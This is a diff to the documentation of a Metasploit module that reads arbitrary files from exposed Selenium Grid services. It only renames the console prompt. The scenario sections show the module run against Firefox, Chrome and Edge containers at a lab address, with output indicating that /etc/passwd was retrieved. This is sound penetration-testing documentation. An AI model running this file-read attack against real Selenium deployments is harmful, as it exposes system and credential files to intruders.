@@ -56,8 +56,8 @@ executed. Defaults to 75 seconds.
 ## Scenarios
 ### selenium/standalone-firefox:3.141.59 installed with Docker on Ubuntu 24.04
 ```
-msf6 > use auxiliary/gather/selenium_file_read
-msf6 auxiliary(gather/selenium_file_read) > options
+msf > use auxiliary/gather/selenium_file_read
+msf auxiliary(gather/selenium_file_read) > options
 
 Module options (auxiliary/gather/selenium_file_read):
 
@@ -76,7 +76,7 @@ Module options (auxiliary/gather/selenium_file_read):
 
 View the full module info with the info, or info -d command.
 
-msf6 auxiliary(gather/selenium_file_read) > run rhost=192.168.56.16 rport=4445
+msf auxiliary(gather/selenium_file_read) > run rhost=192.168.56.16 rport=4445
 [*] Running module against 192.168.56.16
 [*] Running automatic check ("set AutoCheck false" to disable)
 [+] The target appears to be vulnerable. Version 3.141.59 detected
@@ -115,7 +115,7 @@ pulse:x:106:107:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
 
 ### selenium/standalone-firefox:4.0.0-alpha-6-20200730 installed with Docker on Ubuntu 24.04
 ```
-msf6 auxiliary(gather/selenium_file_read) > run rhost=192.168.56.16 rport=4446
+msf auxiliary(gather/selenium_file_read) > run rhost=192.168.56.16 rport=4446
 [*] Running module against 192.168.56.16
 [*] Running automatic check ("set AutoCheck false" to disable)
 [!] The service is running, but could not be validated. Selenium Grid version 4.x detected and ready.
@@ -153,7 +153,7 @@ pulse:x:105:106:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
 
 ### selenium/standalone-firefox:4.6 installed with Docker on Ubuntu 24.04
 ```
-msf6 auxiliary(gather/selenium_file_read) > run rhost=192.168.56.16 rport=4447
+msf auxiliary(gather/selenium_file_read) > run rhost=192.168.56.16 rport=4447
 [*] Running module against 192.168.56.16
 [*] Running automatic check ("set AutoCheck false" to disable)
 [!] The service is running, but could not be validated. Selenium Grid version 4.x detected and ready.
@@ -192,7 +192,7 @@ pulse:x:106:107:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
 
 ### selenium/standalone-firefox:4.27.0 installed with Docker on Ubuntu 24.04
 ```
-msf6 auxiliary(gather/selenium_file_read) > run rhost=192.168.56.16 rport=4448
+msf auxiliary(gather/selenium_file_read) > run rhost=192.168.56.16 rport=4448
 [*] Running module against 192.168.56.16
 [*] Running automatic check ("set AutoCheck false" to disable)
 [!] The service is running, but could not be validated. Selenium Grid version 4.x detected and ready.
@@ -228,7 +228,7 @@ pulse:x:101:102:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
 
 ### selenium/standalone-chrome:4.27.0 installed with Docker on Ubuntu 24.04
 ```
-msf6 auxiliary(gather/selenium_file_read) > run rhost=192.168.56.16 rport=4453 BROWSER=chrome
+msf auxiliary(gather/selenium_file_read) > run rhost=192.168.56.16 rport=4453 BROWSER=chrome
 [*] Running module against 192.168.56.16
 [*] Running automatic check ("set AutoCheck false" to disable)
 [!] The service is running, but could not be validated. Selenium Grid version 4.x detected and ready.
@@ -264,7 +264,7 @@ pulse:x:101:102:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
 
 ### selenium/standalone-edge:4.27.0 installed with Docker on Ubuntu 24.04
 ```
-msf6 auxiliary(gather/selenium_file_read) > run rhost=192.168.56.16 rport=4454 BROWSER=MicrosoftEdge
+msf auxiliary(gather/selenium_file_read) > run rhost=192.168.56.16 rport=4454 BROWSER=MicrosoftEdge
 [*] Running module against 192.168.56.16
 [*] Running automatic check ("set AutoCheck false" to disable)
 [!] The service is running, but could not be validated. Selenium Grid version 4.x detected and ready.
